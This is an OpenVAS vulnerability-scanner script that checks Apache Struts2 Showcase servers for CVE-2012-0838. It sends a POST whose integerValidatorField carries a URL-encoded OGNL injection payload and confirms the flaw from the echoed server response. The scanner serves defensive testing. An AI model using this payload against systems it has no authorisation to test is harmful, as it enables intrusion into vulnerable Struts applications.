##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_apache_struts_showcase_java_method_exec_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Apache Struts2 Showcase Arbitrary Java Method Execution vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation could allow an attacker to execute arbitrary java
  method. Further that results to disclose environment variables or cause a
  denial of service or an arbitrary OS command can be executed.
  Impact Level: Application";
tag_affected = "Apache Struts2 (Showcase) version 2.x to 2.2.3";

tag_insight = "The flaw is due to an improper conversion in OGNL expression if a non
  string property is contained in action.";
tag_solution = "Upgrade Apache Struts2 to 2.2.3.1 or later,
  For updates refer to http://struts.apache.org/download.cgi";
tag_summary = "This host is running Apache Struts Showcase and is prone to
  java method execution vulnerability.";

if(description)
{
  script_id(802425);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-0838");
  script_bugtraq_id(49728);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-13 14:59:53 +0530 (Tue, 13 Mar 2012)");
  script_name("Apache Struts2 Showcase Arbitrary Java Method Execution vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "
  Affected Software/OS:
  " + tag_affected + "
  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://jvn.jp/en/jp/JVN79099262/index.html");
  script_xref(name : "URL" , value : "https://issues.apache.org/jira/browse/WW-3668");
  script_xref(name : "URL" , value : "http://jvndb.jvn.jp/en/contents/2012/JVNDB-2012-000012.html");

  script_description(desc);
  script_summary("Check if Apache Struts Showcase is vulnerable to java method execution vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


## Get HTTP Port

asport = 0;
asreq = "";
asres = "";
asRes = "";
asReq = "";
dir = "";
url = "";

asport = get_http_port(default:8080);
if(!asport){
  asport = 8080 ;
}

## Check the port status
if(!get_port_state(asport)){
  exit(0);
}

## check the possible paths
foreach dir (make_list("", "/struts", "/struts2-showcase"))
{
  ## Send and Receive the response
  asreq = http_get(item:string(dir,"/showcase.action"), port:asport);
  if(asreq)
  {
    asres = http_keepalive_send_recv(port:asport, data:asreq);

    if(asres)
    {
      ## Confirm the application
      if(">Showcase</" >< asres && ">Struts Showcase<" >< asres)
      {
        ## Construct the POST data
        postdata = "requiredValidatorField=&requiredStringValidatorField" +
                   "=&integerValidatorField=%22%3C%27+%2B+%23application" +
                   "+%2B+%27%3E%22&dateValidatorField=&emailValidatorFie" +
                   "ld=&urlValidatorField=&stringLengthValidatorField=&r" +
                   "egexValidatorField=&fieldExpressionValidatorField=";

        url = dir + "/validation/submitFieldValidatorsExamples.action";

        ## Construct the POST request
        asReq = string("POST ", url," HTTP/1.1\r\n",
                       "Host: ", get_host_name(), "\r\n",
                       "User-Agent:  Java-Method-Execution\r\n",
                       "Content-Type: application/x-www-form-urlencoded\r\n",
                       "Content-Length: ", strlen(postdata), "\r\n",
                       "\r\n", postdata);
        asRes = http_send_recv(port:asport, data:asReq);

        if(asRes)
        {
          ##  Confirm the exploit
          if(!isnull(asRes) &&(".template.Configuration@" >< asRes) &&
             ">Struts Showcase<" >< asRes)
          {
            security_hole(asRes);
            exit(0);
          }
        }
      }
    }
  }
}
